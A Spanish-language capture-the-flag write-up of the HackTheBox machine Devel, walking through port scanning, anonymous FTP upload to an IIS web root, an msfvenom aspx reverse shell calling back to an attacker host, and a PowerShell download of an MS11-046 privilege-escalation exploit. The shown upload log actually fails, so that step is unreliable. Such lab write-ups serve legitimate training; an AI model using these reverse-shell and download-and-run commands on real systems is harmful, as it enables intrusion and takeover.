---
title: 'Devel Write Up [OSCP-Style]'
disqus: HackTheBox 
---

Devel WRITE UP [OSCP-Style]
===

Hecho por @xlcc4096 y @CapitanJ4ck21 

## Indice 

[TOC]

> Devel es una máquina Windows de Hackthebox la cual empezaremos descubriendo que todo lo que se sube al servidor FTP esta disponible a traves del servidor web, sabiendo esto subiremos una shell al servidor FTP y a través de visitarla a través del servidor web conseguimos acceso al sistema via el usuario 'web' y escalaremos privilegios aprovechandonos de una vulnerabilidad en el sistema.

## Enumeración
### Escaneo de puertos
Lo primero que hacemos es escanear todo el rango de puertos TCP de la maquina y le pasamos a cada puerto encontrado un escaneo de detección de servicios y scripts de enumeración por defecto de nmap.
```bash=
nmap -p- -sS --min-rate 5000 -A -Pn -n -vvv -oN targeted 10.10.10.5
```
> **Nota:** En el comando no especificamos -sV y -sC, especificamos en su lugar que es el escaneo agresivo que hace -sV, -sC, -O y un --traceroute, esto lo hacemos ya que es un entorno controlado.
```
# Nmap 7.91 scan initiated Tue Dec  8 11:45:38 2020 as: nmap -p- -sS --min-rate 5000 -A -Pn -n -vvv -oN targeted 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up, received user-set (0.30s latency).
Scanned at 2020-12-08 11:45:39 CET for 47s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=12/8%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5FCF5982%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10E%TI=I%II=I%SS=S%TS=7)
OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54DNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.761 days (since Mon Dec  7 17:30:22 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   297.84 ms 10.10.14.1
2   297.89 ms 10.10.10.5

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  8 11:46:26 2020 -- 1 IP address (1 host up) scanned in 48.37 seconds

```



### Puerto 21 / TCP
Descubrimos que el puerto 21 esta abierto y esta corriendo un servidor ftp, `nmap` nos comunico en su salida que se puede acceder a este a traves de usuario anonimo, accedemos y vemos que estan subidos los contenidos del servidor web, despues de subir un archivo de prueba comprobamos que todo lo que se suba al FTP se puede consultar a través del servidor web.

```bash=
ftp 10.10.10.5 
```
```ftp  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:capi): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> !echo "<h1>Hacked by Th3Elite<h1>" > elite.html
ftp> put elite.html 
local: elite.html remote: elite.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
28 bytes sent in 0.00 secs (1012.7315 kB/s)
ftp> bye
221 Goodbye.

```
### Puerto 80 / TCP

Detectamos que subimos los ficheros en la web.

![](https://i.imgur.com/vzF6jSt.png)


## Explotación

Generamos la shell en un formato aspx (si se genera en ASP no hay problema la única diferencia entre ASPX y ASP, es que ASPX puede contener también html) con msfvenom, en este formato porque es un servidor IIS.

```bash=
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT=31337 -f aspx >reverse.aspx
```
Nos conectamos la servidor FTP y subimos nuestra shell
```bash=
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:capi): anonymous 
331 Password required for anonymous .
Password:
530 User cannot log in.
Login failed.
Remote system type is Windows_NT.
ftp> put exploits/testing/reverse.aspx 
local: exploits/testing/reverse.aspx remote: exploits/testing/reverse.aspx
530 Please login with USER and PASS.
ftp: bind: Address already in use
ftp> bye
221 Goodbye.
```

Con la shell subida al servidor web lo que haremos ahora sera visitar nuestra shell para que nos devuelva una conexion a nuestro netcat que previamente ya esta puesto a la escucha.
```
rlwrap nc -lnvp 31337
listening on [any] 31337 ...
```

```bash=
curl http://10.10.10.5/reverse.aspx
```

## Escalada de Privilegios
Ya tenemos acceso al sistema ahora lo que haremos sera enumerar el sistema para intentar encontrar algun vector para la escalada de privilegios.
### Enumeración
Lo primero que hacemos es ver a que sistema nos enfrentamos con `systeminfo`, para hacer un filtro de la info que necesitamos utilizamos el siguiente comando: 

```bat
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
```
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```


## Explotación 
A través de la enumeración del sistema detectamos que el sistema es vulnerable a MS11-046 la cual es una vulnerabilidad que se encuentra en el AFD.sys que consiste en que este driver valida de forma erronea los datos que el usuario da al kernel, esto nos ayudara a escalar privilegios en el sistema.
https://www.exploit-db.com/exploits/40564
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046
Una vez tenemos compilado el exploit lo que hacemos es transferir este al sistema objetivo de la siguiente manera. 

```powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.15:8000/ms11-046.exe', 'C:\tmp\ms11-046.exe')
```
Una vez descargado en la máquina el exploit lo ejecutamos.
```
.\ms11-046.exe
```
Y ya conseguimos shell como SYSTEM.
```bat
whoami 
nt authority\system
```
